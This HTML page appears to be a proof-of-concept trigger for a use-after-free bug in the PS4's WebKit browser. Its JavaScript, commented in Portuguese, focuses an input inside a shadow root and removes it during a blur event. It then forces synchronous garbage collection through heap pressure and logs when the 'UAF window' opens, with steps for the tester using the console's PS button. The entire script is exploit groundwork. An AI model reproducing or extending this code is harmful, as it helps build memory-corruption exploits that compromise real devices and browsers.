
<!DOCTYPE html>
<html>
<body>
<p>This test passes if it does not crash 2.</p>
<div id="host"></div>
<div id="result"></div>
<script>
function log(msg) {
    var d = document.createElement('div');
    d.textContent = msg;
    result.appendChild(d);
}

// Check 1: native gc() existe no PS4?
if (typeof gc === 'function') {
    log('[GC] NATIVE gc() disponivel: ' + gc.toString().slice(0, 80));
} else {
    log('[GC] sem native gc() — usando pressao de heap');
}

// Polyfill de GC agressivo: pre-enche o heap (old-gen),
// depois solta tudo e aloca mais → força full collection síncrono
var heapFill = [];
(function prefill() {
    try {
        for (var i = 0; i < 40000; i++) {
            heapFill.push(new Uint8Array(4096)); // 4KB cada = ~80MB total
        }
        log('[Heap] pre-fill: ' + heapFill.length + ' blocos (~' +
            Math.round(heapFill.length * 4096 / 1048576) + 'MB)');
    } catch(e) {
        log('[Heap] pre-fill parou em ' + heapFill.length + ': ' + e.message);
    }
})();

function aggressiveGC() {
    // Solta o fill → ~80MB de garbage de uma vez
    heapFill = null;

    // Aloca novo bloco grande: JSC precisa de espaço,
    // não tem → full GC síncrono → coleta wrapper do victim
    var trigger = [];
    try {
        for (var i = 0; i < 5000; i++) {
            trigger.push(new Uint8Array(4096));
        }
    } catch(e) { /* OOM esperado → GC rodou */ }
    trigger = null;

    // Fallback: polyfill original
    function gcRec(n) {
        if (n < 1) return {};
        var temp = {i: "ab" + i + (i / 100000)};
        temp += "foo";
        gcRec(n-1);
    }
    for (var i = 0; i < 10000; i++) gcRec(10);
}

// Setup
let shadowRoot = host.attachShadow({ mode: 'open' });
let victim = document.createElement('input');
victim.type = 'text';
victim.tabIndex = 0;
shadowRoot.appendChild(victim);
victim.focus();

log('[Setup] shadow.activeElement: ' + host.shadowRoot.activeElement?.tagName);
log('[Heap] pre-fill concluido — pronto para trigger');

let collected = false;
let reg = new FinalizationRegistry(() => {
    collected = true;
    log('[GC] WRAPPER COLETADO SINCRONAMENTE — UAF window aberta');
});
reg.register(victim, 'v');

let blurFired = false;

document.addEventListener('blur', function onBlur(e) {
    blurFired = true;
    log('[Blur] target: ' + e.target.tagName);
    log('[Before remove] shadow: ' + (host.shadowRoot.activeElement?.tagName || 'null'));

    victim.remove();
    log('[After remove] shadow: ' + (host.shadowRoot.activeElement?.tagName || 'null'));

    victim = null;
    reg = null;

    // Tenta native gc() primeiro, fallback para pressão de heap
    if (typeof gc === 'function') {
        log('[GC] chamando native gc()');
        gc();
    } else {
        log('[GC] pressao de heap...');
        aggressiveGC();
    }

    log('[After GC] collected (sincrono): ' + collected);
    document.removeEventListener('blur', onBlur, true);
}, true);

window.addEventListener('blur', function() {
    log('[Window] blur — blurFired: ' + blurFired);
    // Se blurFired=false aqui, o blur do victim nao disparou
});

document.addEventListener('visibilitychange', function() {
    log('[Visibility] ' + document.visibilityState +
        ' | collected: ' + collected);
    if (document.visibilityState === 'visible' && !blurFired) {
        log('[ERRO] blur do victim nao disparou — victim nao estava focado no C++');
    }
});

log('[Ready] Botao PS → XMB → volte (sem clicar no input antes)');
</script>
</body>
</html>
